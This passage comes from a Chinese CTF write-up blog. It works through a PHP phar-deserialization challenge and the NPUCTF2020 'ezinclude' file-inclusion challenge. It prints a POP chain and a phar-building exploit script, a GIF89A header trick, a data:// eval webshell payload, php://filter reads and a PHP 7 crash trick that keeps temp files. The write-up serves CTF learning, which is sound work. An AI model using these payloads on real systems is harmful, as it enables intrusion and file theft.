class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=upload_file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">upload_file</span>(); <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=function.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123; <br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    &#125; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//file.php?file=class.php</span><br> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>注意这段代码和注释<code>//$this-&gt;source = phar://phar.jpg</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br></code></pre></td></tr></table></figure><p>注意<code>file.php</code>下有这么个东西：</p><p><code>ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); </code>结合注释<code>f1ag.php</code></p><p>目标文件<code>/var/www/html/f1ag.php</code></p><p><code>phar</code>反序列化，先写链子：</p><p>提示<code>flag</code>在<code>f1ag.php</code>中，<code>C1e4r</code>下存在<code>__destruct</code>，以这东西为起点调用<code>Show</code>下的<code>__toString</code>。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span> -&gt; str = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//触发Show下的__toString方法，因为一个类被当成字符串了</span><br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//触发__get方法，因为Test底下并没有source。这时$key就是source</span><br><span class="hljs-variable">$c</span> -&gt; params = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>);<span class="hljs-comment">//注意ini_set</span><br></code></pre></td></tr></table></figure><p>生成<code>phar</code>文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span> -&gt; str = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; params = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>);<br><br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pharwhat.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>生成<code>pharwhat.phar</code>，然后修改下后缀:<code>&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;</code>挑一个就行。</p><p>注意：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br></code></pre></td></tr></table></figure><p>如果我们上传<code>pharwhat.jpg</code>，那么最终上传路径是：</p><p><code>upload/92f5bc75f24c46a61e46ab7b46dcb42d.jpg</code></p><p><img src="/img/simplephp18.png" alt="simplephp18"></p><p>然后base64解码就行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//$a = &#x27;flag&#123;0ad36cdc-1e96-44ed-a9cb-a5fe000473c7&#125;&#x27;;</span><br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>后面看其它师傅们的<code>wp</code>时发现在生成<code>phar</code>文件时可以这么写：</p><p><code>$phar-&gt;setStub(&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);</code></p><p>其实就是加了个<code>GIF89A</code>欺骗头，这道题不加也能拿结果(因为并没有检测文件内容)。生成的文件内容是：</p><p><img src="/img/simplephp4.png" alt="simplephp4"></p><p>看样子以后还是加上欺骗头好一些，不加白不加。。</p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="/img/ezinclude1.png" alt="ezinclude1"></p><p>看源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">username/password error<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>抓包：</p><p><img src="/img/ezinclude2.png" alt="ezinclude2"></p><p>注意<code>Cookie</code>里给了哈希值，想着这东西会不会要求<code>$pass</code>变量强等于它？不过<code>pass</code>怎么 传也没说，就用<code>GET</code>方法传着试了试：</p><p><img src="/img/ezinclude3.png" alt="ezinclude3"></p><p>访问<code>flflflflag.php</code></p><p><img src="/img/ezinclude4.png" alt="ezinclude4"></p><p>我这个环境不知道怎么回事一直回显<code>404</code>。。只能在<code>bp</code>上看了：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">           <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>include($_GET[&quot;file&quot;])<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>文件包含，不过要包含啥也没提示，想着写个一句话进去：</p><p><code>data://text/plain,%3C?php%20@eval($_POST[%27viper%27]);?%3E</code></p><p><img src="/img/ezinclude5.png" alt="ezinclude5"></p><p><code>data</code>,<code>input</code>这种能执行命令的协议都被过滤了，不过<code>filter</code>还能用，尝试读下<code>flflflflag.php</code>源码</p><p><code>/flflflflag.php?file=php://filter/convert.base64-encode/resource=flflflflag.php</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">           <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span>=<span class="hljs-string">&quot;404.html&quot;</span>;</span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-meta">$file=$_GET[&#x27;file&#x27;];</span><br><span class="hljs-meta">if(preg_match(&#x27;/data|input|zip/is&#x27;,$file))&#123;//is表示忽略大小写加单行匹配</span><br><span class="hljs-meta">die(&#x27;nonono&#x27;);</span><br><span class="hljs-meta">&#125;</span><br><span class="hljs-meta">@include($file);</span><br><span class="hljs-meta">echo &#x27;include($_GET[&quot;file&quot;])&#x27;;</span><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>后面看了<code>wp</code>，用御剑还能扫出来<code>dir.php</code>这么个东西，利用伪协议读他的源码：</p><p>参考<code>https://www.shawroot.cc/1159.html</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//file=php://filter/read=convert.base64-encode/resource=dir.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;/tmp&#x27;</span>));<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//获取指定目录（此处为/tmp）中的所有文件和目录，并打印它们的详细信息</span><br><br></code></pre></td></tr></table></figure><p>php7.0的bug：</p><p><code>?file=php://filter/string.strip_tags/resource=/etc/passwd</code></p><p>使用php:&#x2F;&#x2F;filter&#x2F;string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录。该方法仅适用于以下php7版本，php5并不存在该崩溃。</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs dns">• php<span class="hljs-number">7.0.0-7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">1</span>.<span class="hljs-number">2</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.1.3-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>可以利用， <span class="hljs-number">7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">1</span>x版本的已被修复<br><br>• php<span class="hljs-number">7.2.2-7</span>.<span class="hljs-number">2</span>.<span class="hljs-number">8</span>可以利用， <span class="hljs-number">7</span>.<span 